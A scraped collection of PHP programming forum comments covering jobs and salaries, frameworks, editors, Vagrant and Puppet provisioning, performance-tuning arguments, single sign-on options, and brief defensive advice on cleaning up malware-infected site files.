theres a lot of PHP jobs here in berlin/germany, some companies have a very high php level, most common frameworks used being zend framework &amp; laravel, some do run their own frameworks salary wise berlin is rather at the bottom of the list, compared to what you "need" in berlin obviously the salaries are totally ok - but when you compare it with what you earn in other german cities or other cities world wide, berlin is rather a choice for people who love berlin and not for people who are in it for the money. as for london, as i work closeley with a company that has about 30 php devs in london, i cannot vouch for "very good salaries", they are higher in berlin but after you deduct cost for living (food, rent etc) they earn less then our devs in berlin. i have been told from the devs working there that the pay is totally okay and a bit higher than what other companies did pay in london - i personally dont know absolute numbers so i am just quoting that here so you can handle the information with some caution :)
I love the [The League of Extraordinary Packages](http://thephpleague.com/) I recently used their geotools package and it was pretty awesome.
Well, if you read your original question, that is exactly what you asked. Your example above does not return new \Connector, it sets the property to a new object which is not returned (and connect() will return null). Your second example would work, but a new object would be created and returned each time you call connect(). That might not be desirable for how you want your API to work, although that's up to you (keeping it set in both $this-&gt;connect and then returning it could make more sense as a form of fluent interface).
That is why you should use verbs for methods and nouns for properties. $this-&gt;connector retrieves the property $this-&gt;connect() executes an operation $this-&gt;getConnector() to execute the operation of retrieving a property :)
&gt;$this-&gt;connect() refers to a class method &gt;$this-&gt;connect refers to a class property No, it refers to an *object* method and property respectively. Sorry to be nitpicky, but there is a distinct difference between a *class* method/property and an *object* method/property. The term "Class" is all too often used to mean "Object" and I think it contributes to the misunderstanding of the two concepts. 
You will get an installer for Wamp, for example, which will pretty much set everything up for you. 
I can't speak to the accuracy of these kind of articles... but I do love to see these. Understanding what's happening under the hood is incredibly valuable.
I'd say either Laravel or Symfony. Laravel's easier to use if you're starting out. Symfony's for quite large apps generally. 
https://github.com/mikecao/sparrow
I'm currently taking PHP Fundamentals at Nettuts+ and I can't recommend that course enough. I have done a bit of PHP in the past (mostly learning from books,( *anything by Larry Ullman is awesome BTW*) however I consider myself still a beginner) but that class has been so helpful to my continued learning. The instructor (Jeffery Way) explains thing really well and gives you multiple examples of doing the same thing in several ways to illustrate the concept he's trying to explain. Here's a link if your interested : https://tutsplus.com/course/php-fundamentals/ 
Your company hasn't done an upgrade since january 2011? Prepare for deprecation errors.
I have worked with some people who where being paid £600/day which is pretty close to £100/hr for an 8 hour work day.
I just started in this company and ....their infrastructure is a mess :|
k thanks ill give this a try :D
You can replace `-A 4 -B 4` with `-C4`, for context before and after.
Thank You, this is the way I thought would be the best way to go about it. I'm confused as to why someone downvoted you though. Maybe because like you said it is a very basic way to do it. What is the non basic way? I can see using things like jquery (which I have no experience with) to improve storing the tags, but what other ways can you handle searching for multiple tags? 
I love also like these very much! Yes, everyone can have a look at the code for him/herself. But I would not understand things like this by just looking at the code.
You may find warnings about date(). Here's some info on how to fix it: http://stackoverflow.com/questions/5535514/how-to-fix-warning-from-date-in-php
I don't see the need for alphabetization - i like it best when it's ordered by occurrence in the code.. You know you can type to search in that popup? At least you don't need alphabetization to make things easier to look up.
But wouldn't rewriting the site later on be a massive ball ache? I guess why Facebook still use PHP and have to create things like HHVM to get the performance they need.
If you already do the hard pain-in-the-ass huge upgrade jump, why not instant go to PHP 5.5(.7)?
An IDE is what you use to edit, a framework is a library of code that helps you build things. Symfony and Laravel are frameworks, they're code libraries. Sublime Text, Notepad++ are editors. `git` is version control. 
&gt;An IDE is what you use to edit &gt;Sublime Text, Notepad++ are editors Therefore Sublime Tex and Notepad++ are IDE's?
The date() problem is a simple fix as outlined in the link. You just need to set the timezone in php.ini to avoid any ambiguity. If you have the option of building a new machine, go for it because if you are working on this live and the system is in use, you can bet you're going to have some issues and downtime.
It's disappointing that classes are not covered. They're not really covered in Sara Golemon's book either. In fact, I don't think they're covered anywhere on the web. There's still so many gaps in the knowledge base on writing extensions.
While salary and benefits are important I think what's more important is wherever you are working your experience and skill is appreciated and taken seriously. It's fun getting paid but what's the point if your employer/client doesn't care or even worse doesn't understand what you do. I'd take a cut in salary if it meant my input was valued and my experience/skills were actually put into use.
An IDE is a special term (acronym for Integrated Development Environment) for an editor that has built-in tools to deal with the language. An example would be Eclipse which has a lot of built-in tools like code completion and syntax checking (among other things.) Notepad++ are in general considered basic editors, not IDEs. So an IDE is an editor but not all editors are IDEs
Funny enough, the author's name is Matthew Setter. &lt;/dadjoke&gt;
Congrats! When I first started PuPHPet, I tried Chef and Salt before deciding on Puppet. I couldn't get Salt's Hello World to run via Vagrant, so I dropped it completely. Ansible was only thrown my way one or two times so I didn't give it much thought. It's great you've already got a bunch of options available! I'll be honest: the biggest hurdle for me to adding new things is the GUI. All the relationships and requirements each thing has is a bother to visualize, but needs done. As a sidenote: PuPHPet is completely managed via a yaml file, too!
There's too many to post here. I watch this sub all the time and never see things like https://github.com/phine/lib-phar
`__construct()` is a magic method, anyone here not using it?
Okay, thanks for the reply. So, are editors (Notepad++) acceptable for most tasks or is it advisable to move on over to an IDE? Does putting your project on GIT happen independent of the editor or IDE, or does it somehow integrate into those?
Puppet is a beast, but once you wrap your head around how it works it makes sense, even though some of its design choices are really stupid[0]. One of the complicated things Puppet is good at is dependencies. I have only slightly looked at Ansible but it appears that it basically goes top to bottom, yes? How does Ansible handle a package needing installed or a command needing run before $foo? [0] Foreach was not added until very recently
Entirely preference (unless you're working on iphone apps or something where you have to use XCode). Git isn't an acronym, it doesn't need to be capitalized. Some IDEs have integration with version control like Git, SVN, and CVS but you don't need an IDE to work with a version control system like git.
Ya I had worked with puppet quite awhile and just got frustrated with how unnecessarily complex and slow it was. I had to do the same thing you did with PuPHPet and run the bleeding edge in order to get access to the loops to accomplish anything. Ansible does go top to bottom. You could say it was inspired by all the shortcomings of Puppet and Chef so it took those things into account. Typically if you depended on a package you would just run apt: pkg=apache before you run the other steps. Since its loaded in order you just put them in the order they need to work. They also have other things like notify which fires off tasks later, typically used to restart services. However its just a different tool to do the job and is not without some drawbacks. They seem to be really quick in fixing and pushing new updates so I have really enjoyed working with it so far.
Oh sorry, title doesn't really mention that.
Thanks for your perspective! I think I will spend some time going through some php tutorials, maybe for 3-4 weeks and then try to dive into a framework. Any reason you recommend laravel vs. Yii or kahona or cakephp?
I can't recommend this enough! Wordpress is not a be-all-do-all system, never has been, never will be. But yet, people utilize it for anything. Big shopping cart? Wordpress! Multi Company Support System? Wordpress! Employee Management System? Wordpress! Wordpress should never be used to handle things that it WAS NOT DESIGNED FOR. It's a blogging platform. Can it handle e-commerce? Sure, after many plugins, abstracting away the core functionality, and loading it up with a metric ton of libraries.
 http://i.imgur.com/iqcYAou.jpg Wow ░░░░░░░░░▄░░░░░░░░░░░░░░▄░░░░ ░░░░░░░░▌▒█░░░░░░░░░░░▄▀▒▌░░░ ░░░░░░░░▌▒▒█░░░░░░░░▄▀▒▒▒▐░░░ ░░░░░░░▐▄▀▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐░░░ ░░░▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌░░░ ░░▐▒▒▒▄▄▒▒▒▒░░░▒▒▒▒▒▒▒▀▄▒▒▌░░ ░░▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐░░ ░▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌░ ░▌░▒▄██▄▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌░ ▀▒▀▐▄█▄█▌▄░▀▒▒░░░░░░░░░░▒▒▒▐░ Amaze
I use SFTP + automatic uploading in PHPStorm when I'm working in ghetto mode without source control... works perfectly, and quickly. Haven't had a single issue with it in 2 years of use. I wonder if it could be something specific to a certain server config.
There's also this one, it's about PHPUnit in general and of course includes mocks, but their usage is not as intuitive as with the one I linked: http://otroblogmas.com/wp-content/uploads/2011/06/PHPUnit-Cheat-Sheet.pdf
Been using PHPStorm for 2 years and never knew about this. Just went through the Emmet site. Too cool. Going to save a lot of time with the angular app i'm building.
&gt; Why would that happen? Seriously. This sounds like a non-issue to me. I wrote this to try to explain some things: https://jtreminio.com/2013/05/introduction_to_vagrant_puppet_and_introducing_puphpet_a_simple_to_use_vagrant_puppet_gui_configurator/ &gt; what is the host? The machine you run Vagrant *from*. &gt; What's the host name? The name of the VM (like jtreminio@macbook) &gt; Can I set it? Yes &gt; Can I run multiple hosts? Yes. To run multiple VMs simultaneously, just give each a different IP and set your forwarded ports accordingly. Or you can run `$x` vhosts within each VM. &gt; Where does my data live? You can easily setup file sharing, so your files live on your host and your guest (the VM) can see and run those files. &gt; Do I have to set up git? You can. With PuPHPet it's done automatically. &gt; Do I need a separate working copy for the vagrant install? Do I change the files that are in vagrant, then commit them, then pull them back to a main copy? With file sharing you're working on the same files that your VM sees, so there's not really a need for this. &gt; What about databases? What's my database doing? Do I install the database on the vagrant install, or somewhere else? You can install what you want. PuPHPet can currently do MySQL and PostgreSQL. More later. &gt; Where is the data? Is it autopopulated? What from? What about test data? Can I keep the test data I've been using, or does it get wiped? You can import your data to your VM's DB. Test data comes from wherever it came from before. Your data lives on if you shutdown or restart your VM, just like a normal computer. ** If you destroy your VM your DB is lost **. You need to setup a strategy to either dump your SQL, or set up Data Fixtures. Most of what you have questions about aren't about Vagrant itself. All Vagrant does is automate the setup of VMs for you. Look at this page: https://jtreminio.com/2012/07/setting-up-a-debian-vm-step-by-step/ Vagrant can automate up to "Installing the Basics", and then it kicks off provisioning process that can automate the rest. The tutorial takes at least 45 minutes the first time around. With a proper Vagrant/Puppet manifest? 3 minutes, repeatable 100%.
My thoughts too. Why not go the whole way?
When both the client and provider are doing things correctly, SOAP is a joy to use. Or so I tell myself. I've never actually seen a case where both the client and provider are doing things correctly...
Believe me even though I don't shy away from this because it will be a great learning experience, I wish I had some help. 
Can you put it back on the devs? If I were you, I'd send an email to all of the devs with the links above, and ask if there's anything concerning or any reason why an upgrade might have problems. If they say no and something goes wrong that's documented there, it's their fault for not reading it well. If for some reason you can't do this, you might want to setup a test environment with the new version, and run the software there and look for bugs. Even better, if they have an automated test suite, run that on the new environment.
Yeah I think thats what I will do. I am not going to get help from the Dev team. I am sure of that. :|
Sorry to hear that -- good luck though!
Don't compile PHP from source. It's not worth the headache. It won't compile into where the rest of your OS' packages expect it to be. Upgrade to CentOS 6, and get the package that's catered to your OS. Otherwise, you'll be debugging the godawful mess for weeks, if not months. And that's to say nothing of the feature deprecation problems you'll run into. Don't compile PHP from source unless there's absolutely no other option, and you absolutely require the most recent, bleeding-edge version.
HOLY GOD
http://codepad.viper-7.com/KFaDIr
CentOS 5 may not have it; does CentOS 6? I had been using PHP for &gt;6 years the first time I tried compiling from source, because I thought I had to install a patch to the code. It took at least a day just to get all the dependencies sorted out, then another day to figure out why PHP wouldn't work properly with Apache any more after that--because the Makefile wanted to install PHP into a completely different location than Debian's package was. Eventually I discovered that Suhosin covered the issue I thought I had, so I used the OS package to install it. Don't make PHP from source unless there is literally no way to avoid doing it. It's not worth the trouble you'll go through to make it happen, and it's not worth the potential trouble you're lining yourself up for.
The argument from my boss would be that if we install via RPMs then there will be a hit in performance. Is that true? Lets say that RPM install of PHP does not hinder performance, can I install Apache manually and still use PHP that was RPM based?
Well that certainly answers the question for the first file! If it's not too much to ask, could you run the additional 4 files in that gist to see the output? And what was your methodology for looking at these 'potentially' harmful files? Thanks!
Who uses SOAP? REST FTW!
This is the case with REST too.
Are they really always run if they're not present? You cannot create a ReflectionMethod for __construct if it's not defined in the class tree. Same applies for method_exists.
Thanks, yeah I'm not migrating for the sake of migrating - I have good reasons. That said, I'm very happy to have switched to PostgreSQL - the tools and docs are very nice, and now I don't feel so beholden to Oracle's MySQL moves and Google (re MariaDB). I've actually just switched to using PDO, although only because I ran out of time finding enough info about PHP's postgresql functions. While building my own apps and starting my own framework I'm finding a lot of advice from blogs etc has an obsession with abstraction/OOP over pragmatic performance, for example, now I'm finding it's actually easy to swap databases - writing another db class is easy... so where possible I'd rather use a native db driver than PDO if it's going to be faster as some benchmarks show. But I'm hoping future faster hardware will alleviate this, so I'm using PDO for now. Thanks for the advice and sorry for the late reply - had my head in PDO, haha.
Thanks, yeah I'm really loving Postgres for a multiple reasons and wish I had switched sooner. All my 'serious' reasons aside for switching - it just feels 'cleaner', which I'm sure sounds stupid. Yeah the migration has gone without a hitch and I'm rolling with PDO now. Thanks again for the post and sorry for the late reply - had my head in new docs to read, haha.
exactly!!
Please don't just move the files but do a backup of the dump and make a list of all plugins/modifications. Make software upgrades and secure the php environment so that it can't happen again. Make sure the hole is not caused by 3rd party modules/plugins/extensions. Contact the owner immediately so he knows what's happening. As the current site might be compromised as well.
You're focusing on micro-tuning your app when I'm sure it has much larger problems. How much time do you honestly think making the changes you suggested in #1 and 2 will reduce your page load time? The answer is going to be less than a millisecond. In question #3 you've rediscovered how PHP apps were organized in 2005 and before. You can certainly create an app with everything routed to single files like login.php and comments.php. You won't have anything close to MVC though if that's your goal. Organizing large applications is far more important than any tiny amount of load time you'd save by going the procedural single page style. Try this... on the first line of your index.php make a variable: $execution_start = microtime(true); and then in your final view file do this: $execution_time = microtime(true) - $execution_start; echo 'Execution time: '.$execution_time.' seconds'; exit; Then try some of the changes you've mentioned and see how much time it shaves off your total execution time. 
Just to further point out, 1 and 2 are *really* *VERY* far from your performance killers. You're probably looking at less than .01% of all time spent on the page in that bit of code. Unless, of course, your code does nothing but that. And even then, memory allocation probably trumps that.
I wonder how they went about parsing and interpreting the WSDL. I'd played with something in PHP before but the support for WSDL was horrible and a lot of the attributes and structures in the ones I had to deal with weren't supported. It was an abandonware flat-file WSDL parsing library that I found somewhere... there are surprisingly few good SOAP tools in PHP. There's also surprisingly few good REST client tools too; I've resorted multiple times to rolling my own via the HttpContext.
Sorry but I find the tone of such replies very off-putting, in particular when you write 'I'm sure it has much larger problems' _ wtf?!? Yes, I am trying to tune my app and its framework for performance as well as meet other criteria I've set - including complying with standards like PSR, OWASP security recommendations, etc. It would be easy to write-off my concerns about performance as the tuning equivalent of premature optimization. But I have the time to research every part of my code, test it, and then return to it to improve it, so there's no penalty for me doing so. My hope is that I will save myself headaches in the future and learn to code better with regards to several criteria - performance to standards to deployment - if I take a little extra bit of time thinking about my coding now rather than latter. I do this for almost all standard-ish best practice conventions I find, for example the use of an autoloader. I'll look for tests like this: http://blog.ircmaxell.com/2012/07/is-autoloading-good-solution.html To some that's overkill, but to many so is writing one's own framework to learn, and I've learned so much more about PHP etc from doing it while reading the code and docs of frameworks than simply building an app with one framework. Speed isn't my only consideration. I think it's easy for people to jump on such a question with that standard 'how much time do you think you'll save?!?!?' reply. Being a PHP nub, and having a server background, I'm also concerned about memory, threads, connections etc. Saving a millisecond may appear neurotic now, but if my app gets a lot of users, I want it scale well without just throwing hardware at it, and when I do roll out new servers, I want each to solve a particular problem or be part of a solution, and where possible put less load on the app as possible. Too often I keep coming across code that looks elegant and cool/fun to code, like a beefed up router class, but ends up making the app do more than it probably should and just adds overhead to it. I think any great product is made up of a balance, and often that is from when learning when to say no to putting in new features - not just user-facing ones - but underlying architectural ones too and letting servers etc do their part. The best example are frameworks that have a lot of config related stuff for development | production that override the php.ini or another daemon/server config. It's good that others have that to make development easy, but I don't need it in my code - I'll edit the original sever configs directly. So, yep, thanks - I certainly will test the speed of my code. I've seen the use of such code before in several frameworks, and the questions I post about are the perfect reason for me to start using it.
This guy puts time and effort into responding to your asinine queries and you call it "off-putting"... seriously? Write it in C if your newbie obsession with efficiency is so overpowering; anyone with actual real-world experience (with or without scalability being the crucial factor) is primarily concerned with DRY, ease of making modifications, sound design, etc.. If you're doing this purely as a mental exercise, then shouldn't you be doing your own work?
It's definitely malware. The bad stuff in the first file is base64_encoded. You can simply run those strings through a base64 decoder (just don't execute those strings as PHP). That will show you what the actual code looks like. The rest are obfuscated code. I'm not really clear on how to de-obfuscate them, but you can generally assume that code like that is a bad idea. This is one of those reasons why the eval() command is such a dangerous thing. The best way to test at this point is to remove the files (comment everything out, if you want) and then run your site normally. If it works, then you're fine. You'll want to go into your PHP settings and disallow any commands that could be potential exploits. Here's a good answer on StackOverflow about which commands are potentially exploitable: http://stackoverflow.com/questions/3115559/exploitable-php-functions Here's another site for instructions on disabling those kinds of commands: http://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/ This is gonna be a pain in the ass, so if you're using Wordpress or something, I highly recommend you update it to the latest, greatest versions. Otherwise, I'd do some research into PHP security (not so much passwords but things like preventing XSS attacks and injection attacks and whatever this kind of exploit is called). Good luck.
&gt; my router class and its performance would be quicker if controllers were all lowercase I didn't mean to be rude in my reply but I think the above strongly suggests that you're way off base. Go ahead and benchmark the amount of time it takes to capitalize your controller names. I would hope any app would have much larger problems than whether the output comes in .5 seconds or .5000002 seconds. 
You have the wrong impression of my issues - I like naming conventions etc - else I wouldn't have such issues with my router etc - because my code is PSR compliant so far. And one reason is, I may use a third party library in the future via Composer or installing it manually, and having namespaces etc set up right will help that. I'm just curious how better coders find a good balance between maintaining adherence to conventions while also writing performance oriented code.
That's the plan. I'm trying to get a handle on what additional, less apparent, issues might have also been created by these files (hence, this post).
Let's back up here... calling my queries 'asinine' shows what an 'ass' you are for starters! There's nothing asinine about asking about maintaining compliance with conventions and trying to code for performance too. If you think there is - it's your intelligence that fails. And when someone tries to assert authority in the opening sentence of their post by posting an unsubstantiated insult as he did with - 'I'm sure it has much larger problems' - yep it's off-putting. As you did the same - calling my queries 'asinine' - there's a very high chance that you can't see that. But returning to the 'harmless nature of asking such questions' as I did... while not being facetious about it as you are suggesting I use C... there's NOTHING 'newbie' about asking about the performance implications of code. Rather, it's more of noob thing to just copy others code and expect it to run fast, scale, etc. I've read books on OOP/SOLID/patterns etc and build my code as MVC/DRY/etc as possible, and not repeating my code/work applies to not writing a function that may not need to exist if it slows performance eg 2. above and a dedicated server can possibly perform that function instead. All I asked was - how better/more experienced coders find a balance between conventions (that I'm following eg PSR) and performance. If I weren't following such 'standards', I wouldn't care to ask about how to balance adhering to them with writing performance oriented code. This is *my* own work - so I have no one to justify it to - and I have the time to look at the best solutions - ones that *balance* convention with performance and deployment/security/etc. Your reply offers nothing constructive - just an obsession with convention and insults.
No worries, I appreciate you writing back. Yeah I'm going to start testing today. The problem with being a nub is one doesn't know what one doesn't know... so I have to ask the most basic questions. I'm still learning how PHP actually executes scripts, manages memory etc, while learning to write standard-ish code, and it's often been a crawl, but I feel I'm starting to stand on my feet now... and perhaps looking at performance is running before I can walk... but I plan to run, and I have the time to really look ahead, so I'm doing the research. Sorry if I was a bit defensive - just so used to people knocking me back on the most basic of questions.
Your concerns about scale in the future are misplaced. Getting something which works is far more important in the early stages of a project. Give this a read: http://gettingreal.37signals.com/ch04_Scale_Later.php. Having said that I seriously doubt that the optimizations you are suggesting here will have any appreciable impact on scale. More critical than outright performance, especially at the micro-optimization level, is maintainability. Your code needs to be something which is easy to understand in the future. This means good strong naming conventions, adherence to coding standards and other best practice and solid design. You dismiss the reply as accusing you of premature optimization - well it is. I'm sorry it just is premature optimization. The saving you will make in this area is utterly irrelevant. You may be concerned about how the server will perform but comparatively speaking better hardware is significantly cheaper than the cost of developers maintaining a body of code. Your remarks about elegance/fun to code is misplaced. Elegance is something that should be embraced. Elegance typically means the code does one thing and does it well and ISN'T bloated with features. If you're seeing code which doesn't fit this bill it simply isn't elegant. 
The first guy's reply was not 'off-puting', he justs seems to have experience and was stating that micro-optimizations like avoiding to uppercase a letter were not worth it, where you could concentrate on more important issues like design. Now about conventions, code is much more easy to maintain if we have them. Try to look up the routers of major frameworks (like Symfony2) and you'll see that an uppercase does not matter. Besides we autoload classes and we can cache the classmap anyway. For what it's worth, I think your approach is good, but don't take critics personally.
Sorry for my nubness, but I have no idea what that first string means, lol. I like python too - in some ways more - but I find php has enough web oriented functions, libraries, server extensions, etc that I'm happy with it and have most of an app built now. As my knowledge and confidence in coding has been improving I've been going back to my original code and reviewing it for performance/security/oop/etc and will keep using php for web apps into the future. If I were to start learning a new language/framework for web apps soon, it would probably be learning more javascript and node.js. What alternative language would you recommend?
The established convention will tend to be a distillation of the balance you seek. These conventions are not just plucked from the sky at random, they are the result of the cumulative effort of some very smart people in the development community. Nobody wants to create a convention which has an enormous impact on performance or scale just for the sake of it. The trade off is made for the sake of maintainability. Further, it is my experience that the majority of performance issues in PHP apps occur between PHP and the database. I don't know the nature of your application but given it is a web app I think it is probably safe to assume that this will hold true for you. Focusing effort on optimizing your DB performance would probably yield better results for scale and performance than addressing a micro optimization in your router. There are alternatives for squeezing performance out of a PHP app that go beyond writing the fastest code at any cost. Caching, off loading long running processes to workers via some form of queue, and good old fashioned load balancing spring to mind.
I think you're considering performance optimisations in areas where there is no performance impact. Manipulating a couple of strings is simply not a taxing task. Your server won't even realise it's happening, it's just nothing. Look at a framework like Symfony 2 or Laravel. They're complex systems that are used by thousands of devs on sites that range from tiny to massive (200 million views a day for the [Symfony 2 powered YouPorn](http://highscalability.com/blog/2012/4/2/youporn-targeting-200-million-views-a-day-and-beyond.html)). If those frameworks can run large scale websites, then your camel-case conversion can run on my toaster.
"The First Rule of Program Optimization: Don't do it. The Second Rule of Program Optimization (for experts only!): Don't do it yet."
You act all humble calling yourself a total n00blet but get offended when people treat you like a n00blet. As the other people here are telling you, it doesn't make sense to worry about performance of a strcmp when there are other bottlenecks orders of magnitude more serious, i.e. your choice of language. If you want a wicked fast strcmp in ASM I can write you one. It's hard to be helpful because your concerns do not make sense to someone with scalability experience. &gt;All I asked was - how better/more experienced coders find a balance between conventions (that I'm following eg PSR) and performance. Most experienced don't prematurely optimize, they eliminate the largest bottlenecks if the marginal cost of fixing them meets the marginal benefit. I like to leave behind code that's readable rather than write something hyperefficient that requires heavy explanation of the logic involved. Modifiability by someone with no experience with your code should be your top concern as a developer.
Good points - I'm questioning conventional wisdom because I'm a nub _and_ 'all/most of this is new to me', I'm getting some 'air to breath' now that I've built a lot of my first app that is compliant with standards like PSR, and I have time to review my code and improve it. It's interesting that you raise optimizing for DB performance. I've grabbed some books on DBs to learn optimizing using them, and just to learn them as much as I can - as I feel I neglected them in the previous apps I built with others, mostly because it was just too much for me to learn in the past. Now I view the domain model/layer as influential on the app as the app's code. Because I'm building a multi-tenant web app, I've had to look at schemas, partitioning, to sharding etc and choose a way that has less pitfalls even if it creates more up-front work. It's really opened my eyes to the functionality/power of DBs. I recently looked for help (not here) with using PHP's postgresql functions instead of mysqli - as I wanted to switch DBs - and I got spammed with 'use PDO!!!', which I ended up doing as it was easier for me to find tutorials for it. Yet I'd seen tests showing PDO to be slower for some types of statements and having its own bugs and missing features compared to delays in updates to PHP's postgresql functions, so I'm still unsure about my choice but rolling with it to be productive. It would appear easier to me to just write another DB class or adjust my existing one to allow me to connect to an additional different DB. But it has opened my eyes to DB standards, in particular commonly and uniquely supported data types, and how DBs store table to column names etc. I've set up my servers for load balancing with nginx but am only just looking at caching now, and I've set up queues for open source apps but not yet found a need to use them in my apps. Thanks again for your clear helpful points.
May I point you towards a nice PostgreSQL abstraction lib: https://github.com/chanmix51/Pomm You may not like it for now given you prefer writing everything from scratch, but it's a nice project, maybe it'll suit you in the future!
Yep, all major ORMs are built on top of PDO anyway, there is a reason
/r/PHP - "Am I Hot or Not" for coders.
Facebook's desire for performance is directly related to profitability: the more they can get out of each server, the fewer servers they have to have. It's an issue of scale. If you had a team of full time accountants, you'd save a little money... and lose a ton paying them. Facebook also has a team of accountants, and they save them money after being paid. You probably don't fit the needs of Facebook, and their increase in performance has a maintenance overhead that would keep you from doing useful things like profiling code, thus losing performance. Because of their needs, Facebook's search for performance would be ongoing regardless of what language they used. Each tiny fraction of a percent gives them significant savings. Google has the same issues, which is why projects like Go and Dart exist to boost their C++/Python/Java/Javascript code. Of course, another aspect of both Go and Dart are ease of use and increased maintainability and quick development cycles. Ease of use and fast development are things that PHP is already pretty good at, so Facebook isn't progressing the base language much (although they do a tiny bit here and there). (Written a bit simplistically to be able to be read and understood by neophytes... mostly omitting other facets of large scale business needs).
&gt; I'm just curious how better coders find a good balance between maintaining adherence to conventions while also writing performance oriented code. They don't. They adhere to the conventions. There is no performance cost. You're creating a false dichotomy.
I just wanted to help you out here. The top comment starts with the following line &gt; You're focusing on micro-tuning your app when I'm sure it has much larger problems. You've taken offence to that. But wrongly. Mr/Ms dead-fish is merely pointing out one (or two) of two possible facts. 1. As a newbie you're bound to have inefficiencies in your code due to an inexperience with effective optimisation strategies, and optimal approaches to specific problems. This isn't just you, this was all of us. 2. The specific problems you highlighted were trivial. It's basically impossible that case selection is any sort of bottleneck in your application. If you really want to optimise properly, you should be finding bottlenecks and fixing those, not continual trivial micro-optimisation in non-problematical areas. Basically... as for the rest... you've come in here asking for help. You've been given that help. You've rejected that help, quite rudely, and then rejected those people who have explained why that help was given in the first place. You come across as a right asshole, and you'll get no further help from me.
I inherited a similar project. $vareable1 through $vareable100 were pretty popular copypasted through a codebase of hundreds of files.
I know somebody who used nothing but lama, llama, lllama, llllama, etc as variables in a Modula-2 program. It was a joke, because it was never intended to be used for more than a single conversion of data. Turns out, it was still used years later. I was at a BBQ thrown by the company, and an admin walked up to me and was proud he finally went through, figure out the meanings of all of the variables and named them meaningfully.
I recently ran into a codebase using [saml](http://simplesamlphp.org/) . It looks interesting, and it's compatibile with Shibboleth, but I don't have much to say about it yet. Maybe someone here does..?
CAS: http://en.wikipedia.org/wiki/Central_Authentication_Service CAS will let you authenticate someone one your site that has logged into another. Or Radius: http://en.wikipedia.org/wiki/RADIUS Not a single sign on, but would allow you to use the same authentication protocol on your site as theirs. In reality, the only corporate signle sign on I know of thta is used widely would be CAS. TLDR: Central Authentication Service (http://en.wikipedia.org/wiki/Central_Authentication_Service) 
Sarcasm? ... I hope...
Oh the joy. Two years at my last job were spent refactoring approximately 1.2 million lines of Indian code. So fun. Not really, though.
You mean like a singleton?
We've just finished a big project for a Fortune 100 where we needed this. Ended up just using an OAuth 2 flow. Central app to manage users and login, then each additional simply uses web flow and persists it's access token. Beautifully simple and no issues. The backing store on the central repo can now use LDAP, AD, RADIUS et al with no trouble.
In my early coding freelancing days I inherited a project that was at different times worked on by low-level Indian and Romanian coders. Variables and comments were in Romanian...
UK schools are starting to use SAML-compatible systems. It looks like an emerging standard for UK education, but not sure about business.
Sounds like OAuth2 + OpenID Connect would suit this project. I recently implemented that utilising the [PHP League's](http://thephpleague.com/) OAuth2 server library and it was pretty easy once I'd read up on OAuth2 and OpenID Connect. OpenID Connect was a little more fiddly as I had to pull together a couple of JWT libraries to get all the functionality I wanted. JWT can take a little getting your head round too. If you want an existing OAuth2 API to look at, check out Google's - it's pretty close to spec and copying their implementation was recommended by a number of sources when I was researching. Checking out the code they use for the [client side authentication](https://code.google.com/p/google-api-php-client/source/browse/#svn%2Ftrunk%2Fsrc%2Fauth) helped a lot when I got stuck.
Nice dog :)
Zendfox is an open source PHP based Web Application Framework. It provides robust web application architecture to build application with ultimate speed and cater perfection up to technology standards.
With that spelling?!
Just because you like python sdl hooks doesn't mean you think that python is the best choice for a website.
I worked on a project where the original creator was doing stuff like the following. I left the formatting and capitalization intact, but changed the variable names. &lt;?php global $FOO; global $BAR; global $BAZ; and &lt;? IF (isset($_REQUEST['something1'])) { IF ($_REQUEST['something1'] == '0') { $_POST['something2'] = '0'; $_REQUEST['something2'] = '0'; } ELSEIF ( (isset($_REQUEST['stuff1'])) &amp;&amp; ($_REQUEST['stuff1'] != $_REQUEST['srsl1']) &amp;&amp; ($_REQUEST['something1'] == '0') ) { $_POST['srsl1'] = '0'; $_POST['something2'] = '0'; $_REQUEST['something2'] = '0'; echo "true"; } ELSE { $_POST['something1'] = $_REQUEST['something1']; } } ELSE { $_POST['something1'] = '0'; } If I were hiring someone, I would have them point out everything wrong with these two snippets.
More sounds like [god object](http://en.wikipedia.org/wiki/God_object) to me.
Screenshot: http://i.imgur.com/V9kAtdE.png
I just hope they _ban_ all private members from their framework. Not being able to override members in framework classes is just stupid. So often I had to just _copy_ half of a class to a subclass because I really needed access to the member. For example the CPagination class. Just horrible.
In fairness. I have naming conventions which are somethings not as descriptive as they could be in exchange for readability. For instance: // always pdo a instance $dbh = new PDO('...'); // always a prepared statement $stmt = $dbh-&gt;prepare('...'); $user = null; if ($stmt-&gt;execute([...]) &amp;&amp; $stmt-rowCount() &gt; 0) { $user = $stmt-&gt;fetch(PDO::FETCH_OBJ); } Basically I'm saying you don't need everything semantically. Just the important bits that actually represent something.
Is there version control? Look at the history behind the first example. I *bet* that at some point, $var had 2 different values based whether it was set/empty or not, and then a requirement changed, so now 'control' is set in either case. Should it be cleaned up? Of course, but I doubt it was written like that on day one.
This is one of my favourites from an inherited project. 10 parameters, some by reference, followed by importing 8 global variables for a grand total of 18 external dependencies on this function call. Brutal. function buildPropertyTree($rentalObject, $clientCompanyID, $startDateTimeStamp, $endDateTimeStamp, $level=0, $userAccountType="LESSOR", $userID = 0, &amp;$passBackChildCount=0, &amp;$passBackTenantCount=0, $skipHTML=false) { global $rentalObjectService,$lesseeService,$rentalAgreementService,$securityCodeService; global $showDisabled,$selectedNode,$expandedArr, $tenantCountArr; // ...followed by about 160 lines of some database access here with some HTML output sprinkled there, etc. 
So, they passed in all these parameters, and then just called them from the global?
... and I respond with asking if my job would entail cleaning up or working with anything like that. The answer would determine whether or not I stuck around to answer your question.
I am needing you to do the needful unless you have or have not done the needful in which case I am needing you to do the needful. 
I broke it.. &lt;?php function has_auth_cookie(){ if(isset($_COOKIE['first_visit'])){ }else{ header('Location: http://www.website.com/welcome/'); } } add_action('template_redirect', 'has_auth_cookie'); ?&gt; Edit - Because stuff.
Try wrapping the code with an is home check. http://codex.wordpress.org/Function_Reference/is_home 
Well that was simple.. I actually love you. I'd have spent hours making some dodgy workaround that would have lead to more problems and more things for me to fix.
